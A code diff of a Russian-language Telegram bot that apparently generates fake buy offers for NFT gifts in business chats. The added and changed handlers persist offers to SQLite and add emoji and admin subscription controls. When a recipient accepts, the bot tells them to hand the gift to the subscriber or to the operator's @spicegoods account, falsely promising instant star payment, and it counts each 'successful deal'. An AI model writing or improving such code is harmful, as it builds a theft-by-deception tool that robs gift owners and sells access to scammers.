@@ -27,12 +27,22 @@ MAIN_ADMIN_ID = int(os.getenv("MAIN_ADMIN_ID", "960992616"))
 PAYMENT_ME = os.getenv("PAYMENT_ME", "spicegoods")
 DEFAULT_HOLDER = "@spicegoods"
 
-# Премиум-эмодзи
-STAR_EMOJI_ID = os.getenv("STAR_EMOJI_ID", "5920433463428650761")
+# --- ПРЕМИУМ-ЭМОДЗИ ---
+STAR_EMOJI_ID = os.getenv("STAR_EMOJI_ID", "5958376256788502078")
 STAR_HTML = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
 
-GRAM_EMOJI_ID = os.getenv("GRAM_EMOJI_ID", "5778546023349621090")
+GRAM_EMOJI_ID = os.getenv("GRAM_EMOJI_ID", "6006074913742396956")
 GRAM_HTML = f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'
+
+TIME_EMOJI_ID = os.getenv("TIME_EMOJI_ID", "5960751816084820359")
+TIME_HTML = f'<tg-emoji emoji-id="{TIME_EMOJI_ID}">⏳</tg-emoji>'
+
+GIFT_EMOJI_ID = "5875180111744995604"
+GIFT_HTML = f'<tg-emoji emoji-id="{GIFT_EMOJI_ID}">🎁</tg-emoji>'
+
+ACCEPT_EMOJI_ID = "5985596818912712352"
+DECLINE_EMOJI_ID = "5985346521103604145"
+TRANSFER_EMOJI_ID = "5832251986635920010"
 
 LOG_CHAT_ID = int(os.getenv("LOG_CHAT_ID", "-1004358051534"))
 LOG_THREAD_ID = int(os.getenv("LOG_THREAD_ID", "1245"))
@@ -48,6 +58,10 @@ cur.execute("CREATE TABLE IF NOT EXISTS channels (channel_id TEXT PRIMARY KEY, c
 cur.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
 cur.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
 cur.execute("CREATE TABLE IF NOT EXISTS promocodes (code TEXT PRIMARY KEY, uses_left INTEGER, days INTEGER)")
+cur.execute("""CREATE TABLE IF NOT EXISTS active_offers (
+    message_id INTEGER PRIMARY KEY, sender_id INTEGER, nft_url TEXT, 
+    nft_title TEXT, count INTEGER, curr TEXT, lang TEXT
+)""")
 cur.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (MAIN_ADMIN_ID,))
 conn.commit()
 
@@ -64,7 +78,6 @@ bot = Bot(BOT_TOKEN)
 dp = Dispatcher()
 log = logging.getLogger("offer")
 OFFER_CMD = re.compile(r"^\.offer\s+(.+)", re.IGNORECASE | re.DOTALL)
-_active_offers = {}
 
 # --- ХЕЛПЕРЫ ---
 def is_admin(user_id: int) -> bool:
@@ -102,13 +115,22 @@ def set_user_setting(user_id: int, column: str, value):
     cur_users.execute(f"UPDATE users SET {column} = ? WHERE user_id = ?", (value, user_id))
     conn_users.commit()
 
+def get_duration_kb(uid: int) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="1 День", callback_data=f"gsub_1d_{uid}"), InlineKeyboardButton(text="1 Неделя", callback_data=f"gsub_7d_{uid}")],
+        [InlineKeyboardButton(text="1 Месяц", callback_data=f"gsub_30d_{uid}"), InlineKeyboardButton(text="Навсегда", callback_data=f"gsub_inf_{uid}")],
+        [InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]
+    ])
+
 # --- ЛОГИ И ПРОВЕРКИ ---
 async def log_sub_grant(user_id: int, dur_text: str):
     try:
         chat = await bot.get_chat(user_id)
         username = f"@{chat.username}" if chat.username else f"ID {user_id}"
     except Exception: username = f"ID {user_id}"
-    text = f"Пользователь {username} получил подписку\nВремя: {datetime.now().strftime('%d.%m.%Y %H:%M')}\nСрок: {dur_text}\nБот - @exit12_bot"
+    
+    now_str = datetime.now().strftime('%d.%m.%Y %H:%M')
+    text = f"Пользователь {username} получил подписку\nВремя выдачи: {now_str}\nСрок подписки: {dur_text}\nБот - @exit12_bot"
     try: await bot.send_message(LOG_CHAT_ID, text, message_thread_id=LOG_THREAD_ID)
     except Exception: pass
 
@@ -188,22 +210,31 @@ def parse_offer_command(text: str) -> tuple[int, str] | None:
     if not count_match or not url_match: return None
     return int(count_match.group(1)), normalize_nft_url(url_match.group(1))
 
+# ИЗМЕНЕНО ЗДЕСЬ
 def build_offer_text(user_name: str, count: int, nft_url: str, nft_title: str, lang: str, curr: str) -> str:
     safe_name = html.escape(user_name)
     safe_title = html.escape(nft_title)
     curr_symbol = STAR_HTML if curr == 'stars' else f"{GRAM_HTML} GRAM"
     
-    if lang == 'en': return (f"💎 <b>{safe_name} offers you {count:,}</b>\n{curr_symbol} <b>for the gift <a href=\"{nft_url}\">{safe_title}</a>.</b>\n\n<i>Valid for 24 h.</i>")
-    elif lang == 'ar': return (f"💎 <b>{safe_name} يقدم لك {count:,}</b>\n{curr_symbol} <b>مقابل الهدية <a href=\"{nft_url}\">{safe_title}</a>.</b>\n\n<i>صالح لمدة 24 ساعة.</i>")
-    elif lang == 'zh': return (f"💎 <b>{safe_name} 向您提供 {count:,}</b>\n{curr_symbol} <b>以换取礼物 <a href=\"{nft_url}\">{safe_title}</a>。</b>\n\n<i>有效期为 24 小时。</i>")
-    else: return (f"💎 <b>{safe_name} предлагает вам {count:,}</b>\n{curr_symbol} <b>за подарок <a href=\"{nft_url}\">{safe_title}</a>.</b>\n\n<i>Действует 24 ч.</i>")
+    if lang == 'en': 
+        return (f"{GIFT_HTML} <b>{safe_name} offers you {count:,}</b>\n{curr_symbol} <b>for the gift <a href=\"{nft_url}\">{safe_title}</a>.</b>\n\n{TIME_HTML} <i>Valid for 24 h.</i>")
+    elif lang == 'ar': 
+        return (f"{GIFT_HTML} <b>{safe_name} يقدم لك {count:,}</b>\n{curr_symbol} <b>مقابل الهدية <a href=\"{nft_url}\">{safe_title}</a>.</b>\n\n{TIME_HTML} <i>صالح لمدة 24 ساعة.</i>")
+    elif lang == 'zh': 
+        return (f"{GIFT_HTML} <b>{safe_name} 向您提供 {count:,}</b>\n{curr_symbol} <b>以换取礼物 <a href=\"{nft_url}\">{safe_title}</a>。</b>\n\n{TIME_HTML} <i>有效期为 24 小时。</i>")
+    else: 
+        return (f"{GIFT_HTML} <b>{safe_name} предлагает вам {count:,}</b>\n{curr_symbol} <b>за подарок <a href=\"{nft_url}\">{safe_title}</a>.</b>\n\n{TIME_HTML} <i>Действует 24 ч.</i>")
 
 def build_offer_keyboard(lang: str = 'ru') -> InlineKeyboardMarkup:
     if lang == 'en': d, a = "Skip", "Confirm"
     elif lang == 'ar': d, a = "تخطي", "تأكيد"
     elif lang == 'zh': d, a = "跳过", "确认"
     else: d, a = "Пропустить", "Подтвердить"
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=d, callback_data="decline_offer"), InlineKeyboardButton(text=a, callback_data="accept_offer")]])
+    
+    decline_btn = InlineKeyboardButton(text=d, callback_data="decline_offer", icon_custom_emoji_id=DECLINE_EMOJI_ID)
+    accept_btn = InlineKeyboardButton(text=a, callback_data="accept_offer", icon_custom_emoji_id=ACCEPT_EMOJI_ID)
+    
+    return InlineKeyboardMarkup(inline_keyboard=[[decline_btn, accept_btn]])
 
 async def handle_offer_command(message: types.Message):
     user_id = message.from_user.id
@@ -229,19 +260,24 @@ async def handle_offer_command(message: types.Message):
     cur_users.execute("UPDATE users SET offers_created = offers_created + 1 WHERE user_id = ?", (user_id,))
     conn_users.commit()
 
-    text = build_offer_text(user_name, count, nft_url, nft_title_from_url(nft_url), lang, curr)
+    nft_title = nft_title_from_url(nft_url)
+    text = build_offer_text(user_name, count, nft_url, nft_title, lang, curr)
     keyboard = build_offer_keyboard(lang)
     preview = LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True, url=nft_url)
 
     try:
         sent_msg = await bot.edit_message_text(text=text, chat_id=chat_id, message_id=message.message_id, reply_markup=keyboard, parse_mode="HTML", business_connection_id=conn_id, link_preview_options=preview)
-        _active_offers[str(sent_msg.message_id)] = {"nft_url": nft_url, "nft_title": nft_title_from_url(nft_url), "sender_id": user_id, "lang": lang, "count": count, "curr": curr}
+        cur.execute("INSERT OR REPLACE INTO active_offers VALUES (?, ?, ?, ?, ?, ?, ?)", 
+                    (sent_msg.message_id, user_id, nft_url, nft_title, count, curr, lang))
+        conn.commit()
     except Exception:
         try: await message.delete()
         except Exception: pass
         try:
             sent_msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=keyboard, parse_mode="HTML", business_connection_id=conn_id, link_preview_options=preview)
-            _active_offers[str(sent_msg.message_id)] = {"nft_url": nft_url, "nft_title": nft_title_from_url(nft_url), "sender_id": user_id, "lang": lang, "count": count, "curr": curr}
+            cur.execute("INSERT OR REPLACE INTO active_offers VALUES (?, ?, ?, ?, ?, ?, ?)", 
+                        (sent_msg.message_id, user_id, nft_url, nft_title, count, curr, lang))
+            conn.commit()
         except Exception: pass
 
 # --- СТАРТ И МЕНЮ ---
@@ -480,7 +516,7 @@ async def admin_stats(callback: types.CallbackQuery):
     total_subs = cur_users.fetchone()[0]
     temp_access = int(get_setting('temp_access') or 0)
     temp_text = f"до {datetime.fromtimestamp(temp_access).strftime('%d.%m %H:%M')}" if temp_access > time.time() else "Выключен"
-    text = f"📊 <b>Статистика:</b>\n\n👥 Пользователей: <b>{total_users}</b>\n⭐ Подписок: <b>{total_subs}</b>\n⏳ Врем. доступ: <b>{temp_text}</b>"
+    text = f"📊 <b>Статистика:</b>\n\n👥 Пользователей: <b>{total_users}</b>\n⭐ Подписок: <b>{total_subs}</b>\n{TIME_HTML} Врем. доступ: <b>{temp_text}</b>"
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]])
     await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
 
@@ -602,30 +638,37 @@ async def process_user_search(message: types.Message, state: FSMContext):
     sub = "Навсегда" if sub_end == 9999999999 else (f"до {datetime.fromtimestamp(sub_end).strftime('%d.%m.%Y')}" if sub_end > time.time() else "Нет")
     text = f"👤 <b>Юзер:</b> <code>{uid}</code>\n💼 Ник: {holder}\n📅 Подписка: <b>{sub}</b>\n🚫 Бан: {'Да' if banned else 'Нет'}\n📈 Офферов: {offs}\n✅ Сделок: {deals}"
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💳 Выдать навсегда", callback_data=f"usr_sub_{uid}"), InlineKeyboardButton(text="❌ Забрать", callback_data=f"usr_unsub_{uid}")],
+        [InlineKeyboardButton(text="💳 Выдать", callback_data=f"usr_sub_{uid}"), InlineKeyboardButton(text="❌ Забрать", callback_data=f"usr_unsub_{uid}")],
         [InlineKeyboardButton(text="🚫 Бан/Разбан", callback_data=f"usr_ban_{uid}")],
         [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
     ])
     await message.answer(text, reply_markup=kb, parse_mode="HTML")
     await state.clear()
 
-@dp.callback_query(F.data.startswith("usr_"))
-async def admin_usr_actions(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
-    action, uid = parts[1], int(parts[2])
-    if action == "sub":
-        cur_users.execute("UPDATE users SET sub_end=9999999999, sub_notified=0 WHERE user_id=?", (uid,))
-        await log_sub_grant(uid, "Навсегда")
-        await callback.answer("✅ Выдано!")
-    elif action == "unsub":
-        cur_users.execute("UPDATE users SET sub_end=0 WHERE user_id=?", (uid,))
-        await callback.answer("✅ Забрано!")
-    elif action == "ban":
-        cur_users.execute("SELECT is_banned FROM users WHERE user_id=?", (uid,))
-        new_status = 0 if cur_users.fetchone()[0] == 1 else 1
-        cur_users.execute("UPDATE users SET is_banned=? WHERE user_id=?", (new_status, uid))
-        await callback.answer(f"✅ {'Забанен' if new_status else 'Разбанен'}!")
+@dp.callback_query(F.data.startswith("usr_sub_"))
+async def admin_usr_sub(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    uid = int(callback.data.replace("usr_sub_", ""))
+    await callback.message.edit_text(f"Выберите срок подписки для юзера <code>{uid}</code>:", reply_markup=get_duration_kb(uid), parse_mode="HTML")
+    await callback.answer()
+
+@dp.callback_query(F.data.startswith("usr_unsub_"))
+async def admin_usr_unsub(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    uid = int(callback.data.replace("usr_unsub_", ""))
+    cur_users.execute("UPDATE users SET sub_end=0 WHERE user_id=?", (uid,))
     conn_users.commit()
+    await callback.answer("✅ Подписка забрана!")
+
+@dp.callback_query(F.data.startswith("usr_ban_"))
+async def admin_usr_ban(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    uid = int(callback.data.replace("usr_ban_", ""))
+    cur_users.execute("SELECT is_banned FROM users WHERE user_id=?", (uid,))
+    new_status = 0 if cur_users.fetchone()[0] == 1 else 1
+    cur_users.execute("UPDATE users SET is_banned=? WHERE user_id=?", (new_status, uid))
+    conn_users.commit()
+    await callback.answer(f"✅ {'Забанен' if new_status else 'Разбанен'}!")
 
 @dp.callback_query(F.data == "admin_give_sub")
 async def admin_give_sub(callback: types.CallbackQuery, state: FSMContext):
@@ -633,14 +676,43 @@ async def admin_give_sub(callback: types.CallbackQuery, state: FSMContext):
     await state.set_state(AdminStates.waiting_sub_user)
 
 @dp.message(AdminStates.waiting_sub_user)
-async def process_give_sub(message: types.Message, state: FSMContext):
+async def process_give_sub_id(message: types.Message, state: FSMContext):
     if not message.text.isdigit(): return
     uid = int(message.text)
-    cur_users.execute("UPDATE users SET sub_end=9999999999, sub_notified=0 WHERE user_id=?", (uid,))
-    conn_users.commit()
-    await log_sub_grant(uid, "Навсегда")
-    await message.answer("✅ Подписка выдана!")
+    await message.answer("Выберите срок подписки:", reply_markup=get_duration_kb(uid))
     await state.clear()
+
+@dp.callback_query(F.data.startswith("gsub_"))
+async def process_grant_sub(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    parts = callback.data.split("_")
+    duration = parts[1]
+    uid = int(parts[2])
+
+    now = int(time.time())
+    if duration == "1d":
+        new_end = now + 86400
+        dur_text = "1 день"
+    elif duration == "7d":
+        new_end = now + 7 * 86400
+        dur_text = "1 неделя"
+    elif duration == "30d":
+        new_end = now + 30 * 86400
+        dur_text = "1 месяц"
+    else: # inf
+        new_end = 9999999999
+        dur_text = "Навсегда"
+
+    cur_users.execute("UPDATE users SET sub_end=?, sub_notified=0 WHERE user_id=?", (new_end, uid))
+    conn_users.commit()
+    await log_sub_grant(uid, dur_text)
+
+    try:
+        await bot.send_message(uid, f"🎉 <b>Вам выдана подписка на {dur_text}!</b>", parse_mode="HTML")
+    except: pass
+
+    await callback.message.edit_text(f"✅ Подписка на {dur_text} выдана юзеру <code>{uid}</code>!", parse_mode="HTML")
+    await callback.answer()
 
 @dp.callback_query(F.data == "admin_remove_sub")
 async def admin_remove_sub(callback: types.CallbackQuery, state: FSMContext):
@@ -655,6 +727,28 @@ async def process_remove_sub_user(message: types.Message, state: FSMContext):
     conn_users.commit()
     await message.answer(f"✅ У юзера {uid} забрана подписка!")
     await state.clear()
+
+# --- СПИСОК ПОДПИСЧИКОВ ---
+@dp.callback_query(F.data == "admin_list_subs")
+async def admin_list_subs(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    cur_users.execute("SELECT user_id, sub_end FROM users WHERE sub_end > ? ORDER BY sub_end ASC", (int(time.time()),))
+    subs = cur_users.fetchall()
+
+    if not subs:
+        text = "📭 Список активных подписчиков пуст."
+    else:
+        text = "👑 <b>Активные подписчики:</b>\n\n"
+        for uid, end_time in subs:
+            if end_time == 9999999999:
+                date_str = "Навсегда"
+            else:
+                date_str = f"до {datetime.fromtimestamp(end_time).strftime('%d.%m.%Y %H:%M')}"
+            text += f"🆔 <code>{uid}</code> — {date_str}\n"
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]])
+    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
+    await callback.answer()
 
 # --- РАССЫЛКА, КАНАЛЫ, АДМИНЫ ---
 @dp.callback_query(F.data == "admin_broadcast")
@@ -778,29 +872,49 @@ async def handle_direct_text(message: types.Message):
 
 @dp.callback_query(F.data == "accept_offer")
 async def process_accept(callback: types.CallbackQuery):
-    offer_data = _active_offers.get(str(callback.message.message_id))
-    if not offer_data or callback.from_user.id == offer_data["sender_id"]:
-        await callback.answer("Ошибка: данные оффера устарели.", show_alert=True)
+    cur.execute("SELECT sender_id, nft_url, nft_title, count, curr FROM active_offers WHERE message_id = ?", (callback.message.message_id,))
+    row = cur.fetchone()
+    
+    if not row:
+        await callback.answer("❌ Ошибка: данные оффера устарели (перезапустите бота).", show_alert=True)
         return
     
-    _active_offers.pop(str(callback.message.message_id), None) # Убираем из кэша
+    sender_id, nft_url, nft_title, count, curr = row
+    if callback.from_user.id == sender_id:
+        await callback.answer("Вы не можете принять собственное предложение!", show_alert=True)
+        return
 
-    cur_users.execute("UPDATE users SET deals_successful = deals_successful + 1 WHERE user_id = ?", (offer_data["sender_id"],))
+    cur.execute("DELETE FROM active_offers WHERE message_id = ?", (callback.message.message_id,))
+    conn.commit()
+
+    cur_users.execute("UPDATE users SET deals_successful = deals_successful + 1 WHERE user_id = ?", (sender_id,))
     conn_users.commit()
-    _, _, sender_holder, sender_sub_end, sender_style = get_user_settings(offer_data["sender_id"])
+    
+    _, _, sender_holder, sender_sub_end, sender_style = get_user_settings(sender_id)
     target = "@spicegoods" if sender_sub_end <= time.time() else (sender_holder or "@spicegoods")
     
-    curr_symbol = STAR_HTML if offer_data["curr"] == 'stars' else f"{GRAM_HTML} GRAM"
-    safe_title = html.escape(offer_data['nft_title']) # <--- ЭКРАНИРУЕМ НАЗВАНИЕ (ЗАЩИТА ОТ БАГА)
+    curr_symbol = STAR_HTML if curr == 'stars' else f"{GRAM_HTML} GRAM"
+    safe_title = html.escape(nft_title)
     
-    preview = LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True, url=offer_data['nft_url'])
+    send_gift_url = f"tg://send_gift?to={target.lstrip('@')}"
+
+    preview = LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True, url=nft_url)
+    
+    get_stars_btn = InlineKeyboardButton(text="Получить звезды", callback_data="recv_stars", icon_custom_emoji_id=STAR_EMOJI_ID)
+    
     if sender_style == 'old':
-        text = f"💎Передайте подарок <a href=\"{offer_data['nft_url']}\">{safe_title}</a> пользователю {target}, звёзды поступят на баланс сразу же."
-        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать", url=offer_data['nft_url']), InlineKeyboardButton(text="Получить звезды", callback_data="recv_stars")]])
+        text = f"{GIFT_HTML} Передайте подарок <a href=\"{send_gift_url}\">{safe_title}</a> пользователю {target}, звёзды поступят на баланс сразу же."
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Передать", url=send_gift_url, icon_custom_emoji_id=TRANSFER_EMOJI_ID)],
+            [get_stars_btn]
+        ])
     else:
         deal_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        text = f"<b>NFT Deal | #TG-{deal_id}</b>\n\nЗарезервировано: {offer_data['count']:,} {curr_symbol}\n\nПередайте подарок {safe_title} покупателю \"{target}\" через «Передать NFT».\n\n⌛️ Резерв: 24 часа."
-        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT", url=offer_data['nft_url'])]])
+        text = f"{GIFT_HTML} <b>NFT Deal | #TG-{deal_id}</b>\n\nЗарезервировано: {count:,} {curr_symbol}\n\nПередайте подарок {safe_title} покупателю \"{target}\" через «Передать NFT».\n\n{TIME_HTML} Резерв: 24 часа."
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Передать NFT", url=send_gift_url, icon_custom_emoji_id=TRANSFER_EMOJI_ID)],
+            [get_stars_btn]
+        ])
     
     try: await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML", link_preview_options=preview)
     except Exception: pass
@@ -812,7 +926,8 @@ async def recv_stars(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data == "decline_offer")
 async def process_decline(callback: types.CallbackQuery):
-    _active_offers.pop(str(callback.message.message_id), None) # Убираем из кэша
+    cur.execute("DELETE FROM active_offers WHERE message_id = ?", (callback.message.message_id,))
+    conn.commit()
     try: await callback.message.edit_text("❌ Вы отклонили предложение.")
     except Exception: pass
     await callback.answer()
@@ -824,7 +939,7 @@ async def background_watcher():
         cur_users.execute("SELECT user_id FROM users WHERE sub_end > ? AND sub_end <= ? AND sub_notified = 0 AND sub_end != 9999999999", (now, now + 86400))
         for (uid,) in cur_users.fetchall():
             try:
-                await bot.send_message(uid, "⚠️ <b>Ваша подписка истекает через 24 часа!</b>", parse_mode="HTML")
+                await bot.send_message(uid, f"{TIME_HTML} <b>Ваша подписка истекает через 24 часа!</b>", parse_mode="HTML")
                 cur_users.execute("UPDATE users SET sub_notified = 1 WHERE user_id = ?", (uid,))
                 conn_users.commit()
             except Exception: pass
